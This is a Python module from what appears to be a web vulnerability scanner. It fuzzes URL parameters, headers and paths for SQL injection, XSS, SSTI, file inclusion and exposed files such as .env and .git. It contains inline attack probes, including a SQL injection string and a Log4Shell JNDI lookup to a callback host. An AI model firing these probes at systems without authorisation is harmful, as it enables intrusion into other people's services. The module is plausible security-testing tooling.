"""
nexsus/modules/fuzzing.py
~~~~~~~~~~~~~~~~~~~~~~~~~
Smart fuzzing engine:
  • Parameter discovery (adds common params to URLs without query string)
  • Multi-payload injection per parameter
  • Response analysis: reflection, error, length diff, status delta
  • Content-Type aware (JSON body fuzzing)
  • Header fuzzing (injection via Host, Referer, X-* headers)
  • Path fuzzing (hidden directories / files)
  • Blind indicator support (timing, OOB)
"""
import asyncio
import json
import re
import time
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode

from nexsus.core.logger import Logger
from nexsus.core.payload_manager import PayloadManager
from nexsus.core.wordlist_manager import WordlistManager


_VULN_TYPE_MAP = {
    "sqli":          ("SQL Injection", "Critical", 9.8),
    "xss":           ("Cross-Site Scripting", "High", 7.4),
    "ssti":          ("Server-Side Template Injection", "Critical", 9.8),
    "lfi":           ("Local File Inclusion", "High", 8.6),
    "rce":           ("Remote Code Execution", "Critical", 10.0),
    "open_redirect": ("Open Redirect", "Medium", 6.1),
    "ssrf":          ("SSRF", "Critical", 9.8),
}

_REFLECTION_MARKER = "NXFUZZ7x9q"

# Payloads that confirm the vuln via response content
_CONFIRMATION_SIGS = {
    "sqli":  [r"SQL syntax", r"ORA-\d{5}", r"mysql_fetch", r"Unclosed quotation"],
    "lfi":   [r"root:x:\d+", r"\[extensions\]", r"<?php"],
    "rce":   [r"uid=\d+", r"root:", _REFLECTION_MARKER],
    "ssti":  ["49", "7777777"],
}


class Fuzzing:
    def __init__(self, orchestrator):
        self.orchestrator  = orchestrator
        self.paused        = False
        self.logger        = Logger("Fuzzing")
        self.payload_mgr   = PayloadManager(orchestrator.current_waf)
        self.wordlist_mgr  = WordlistManager()
        self._fuzzed:      set[str] = set()

    # ── Main entry ─────────────────────────────────────────────────────────────

    async def run(self):
        self.logger.info("Smart Fuzzing Engine…")
        endpoints = list(self.orchestrator.data_store.assets.get("endpoints", set()))
        if not endpoints:
            self.logger.warning("No endpoints — run Active Recon first")
            return

        client = self.orchestrator.http_client
        total  = len(endpoints)

        for idx, url in enumerate(endpoints):
            await self._check_paused()
            self.orchestrator.set_progress(
                percent=round(idx / total * 100, 1), phase="fuzzing"
            )
            if url in self._fuzzed:
                continue
            self._fuzzed.add(url)

            await asyncio.gather(
                self._fuzz_params(client, url),
                self._fuzz_headers(client, url),
                self._fuzz_path(client, url),
                return_exceptions=True,
            )

        self.orchestrator.set_progress(100, "fuzzing")
        self.logger.success("Fuzzing complete")

    # ── Parameter Fuzzing ─────────────────────────────────────────────────────

    async def _fuzz_params(self, client, url: str):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # If no params, inject common ones (param discovery)
        if not params:
            await self._discover_params(client, url)
            return

        # Baseline
        baseline_resp = await client.get(url)
        if not baseline_resp:
            return
        baseline_text = await baseline_resp.text()
        baseline_len  = len(baseline_text)

        for param in list(params.keys()):
            await self._fuzz_single_param(
                client, url, params, param,
                baseline_text, baseline_len,
            )

    async def _discover_params(self, client, url: str):
        """Discover parameters by probing common names."""
        common = self.wordlist_mgr.get("parameters", limit=30)
        for pname in common:
            probe = f"{url}?{pname}={_REFLECTION_MARKER}"
            resp  = await client.get(probe)
            if resp and resp.status == 200:
                text = await resp.text()
                if _REFLECTION_MARKER in text:
                    self.logger.debug(f"Discovered reflective param: {pname} on {url}")
                    # Now fuzz it properly
                    await self._fuzz_single_param(
                        client, url, {pname: [_REFLECTION_MARKER]}, pname,
                        text, len(text),
                    )

    async def _fuzz_single_param(self, client, base_url, params, param,
                                  baseline_text, baseline_len):
        for vuln_type, payloads in self._payload_sets():
            for payload in payloads:
                await self._check_paused()
                new_params = {**params, param: [payload]}
                new_url = (
                    f"{urlparse(base_url).scheme}://{urlparse(base_url).netloc}"
                    f"{urlparse(base_url).path}?{urlencode(new_params, doseq=True)}"
                )

                t0   = time.monotonic()
                resp = await client.get(new_url)
                elapsed = time.monotonic() - t0

                if not resp:
                    continue

                text = await resp.text()

                # Blind timing (SQLi / RCE)
                if elapsed >= 4.5 and "sleep" in payload.lower():
                    await self._report(
                        vuln_type=vuln_type,
                        url=base_url, param=param, payload=payload,
                        evidence=f"Response delayed {elapsed:.1f}s",
                        confirmed=True,
                    )
                    return

                # Error-based signatures
                sigs = _CONFIRMATION_SIGS.get(vuln_type, [])
                if any(re.search(s, text, re.IGNORECASE) for s in sigs):
                    await self._report(
                        vuln_type=vuln_type,
                        url=base_url, param=param, payload=payload,
                        evidence=text[:300], confirmed=True,
                    )
                    return

                # Reflection (XSS, SSTI)
                if payload in text and vuln_type in ("xss", "ssti"):
                    confirmed = vuln_type == "ssti" and "49" in text
                    await self._report(
                        vuln_type=vuln_type,
                        url=base_url, param=param, payload=payload,
                        evidence=text[:300], confirmed=confirmed,
                    )
                    return

                # Significant response length change (SQLi, LFI)
                if abs(len(text) - baseline_len) > 200 and resp.status == 200:
                    await self._report(
                        vuln_type=vuln_type,
                        url=base_url, param=param, payload=payload,
                        evidence=f"Length delta {len(text) - baseline_len} chars",
                        confirmed=False,
                    )
                    return

    # ── Header Fuzzing ────────────────────────────────────────────────────────

    async def _fuzz_headers(self, client, url: str):
        """Inject payloads into common HTTP headers."""
        headers_to_fuzz = [
            "X-Forwarded-For", "User-Agent", "Referer",
            "X-Real-IP", "X-Custom-Header", "CF-Connecting-IP",
            "X-Originating-IP",
        ]
        sqli_probe   = "' OR '1'='1"
        ssti_probe   = "{{7*7}}"
        log4j_probe  = "${jndi:ldap://callback.local/a}"

        for header in headers_to_fuzz:
            for payload in [sqli_probe, ssti_probe, log4j_probe]:
                resp = await client.get(url, extra_headers={header: payload})
                if not resp:
                    continue
                text = await resp.text()
                if "49" in text and ssti_probe == payload:
                    await self._report(
                        vuln_type="ssti",
                        url=url, param=f"header:{header}", payload=payload,
                        evidence=text[:200], confirmed=True,
                    )

    # ── Path Fuzzing ──────────────────────────────────────────────────────────

    async def _fuzz_path(self, client, url: str):
        """Fuzz for hidden directories and files."""
        parsed = urlparse(url)
        if parsed.path and parsed.path != "/":
            return   # only fuzz root-level

        base    = f"{parsed.scheme}://{parsed.netloc}"
        dirs    = self.wordlist_mgr.get("directories", limit=40)
        files   = self.wordlist_mgr.get("files", limit=20)

        baseline = await client.get(base + "/")
        baseline_status = baseline.status if baseline else 200

        for word in dirs + files:
            await self._check_paused()
            test_url = f"{base}/{word.lstrip('/')}"
            resp = await client.get(test_url)
            if not resp:
                continue
            if resp.status in (200, 301, 302) and resp.status != baseline_status:
                text = await resp.text()
                # Filter out generic error pages
                if any(kw in text.lower() for kw in
                       ["404", "not found", "page not found"]):
                    continue
                finding_type = "Exposed Sensitive File" if word in (
                    ".env", ".git", "config.php", "phpinfo.php",
                    "backup.zip", "database.sql"
                ) else "Hidden Directory / Endpoint"
                sev = "High" if "Sensitive" in finding_type else "Low"
                await self._report(
                    vuln_type="info_disclosure",
                    url=test_url, param="path", payload=word,
                    evidence=f"HTTP {resp.status} | {text[:150]}",
                    confirmed=True,
                    title=finding_type,
                    severity=sev,
                    cvss=7.5 if sev == "High" else 3.1,
                )

    # ── Helpers ────────────────────────────────────────────────────────────────

    def _payload_sets(self):
        """Return (vuln_type, payloads) pairs prioritised for fuzzing speed."""
        types = [
            ("sqli",          5),
            ("xss",           5),
            ("ssti",          4),
            ("lfi",           4),
            ("rce",           4),
            ("open_redirect", 3),
        ]
        return [
            (vt, self.payload_mgr.get_payloads(vt, limit=n))
            for vt, n in types
        ]

    async def _report(self, *, vuln_type, url, param, payload,
                       evidence, confirmed,
                       title=None, severity=None, cvss=None):
        label, sev, sc = _VULN_TYPE_MAP.get(
            vuln_type, (vuln_type.upper(), "Medium", 5.0)
        )
        finding = {
            "title":       title or f"Fuzzing — {label}",
            "severity":    severity or sev,
            "cvss":        cvss if cvss is not None else sc,
            "vuln_type":   vuln_type,
            "url":         url,
            "parameter":   param,
            "payload":     payload[:300],
            "evidence":    evidence[:500],
            "remediation": "Validate and sanitise all user-controlled inputs. "
                           "Apply appropriate encoding for the output context.",
            "module":      "Fuzzing",
            "confirmed":   confirmed,
        }
        await self.orchestrator.add_finding(finding)

    async def _check_paused(self):
        while self.paused:
            await asyncio.sleep(0.5)

    def pause(self):
        self.paused = True

    def resume(self):
        self.paused = False
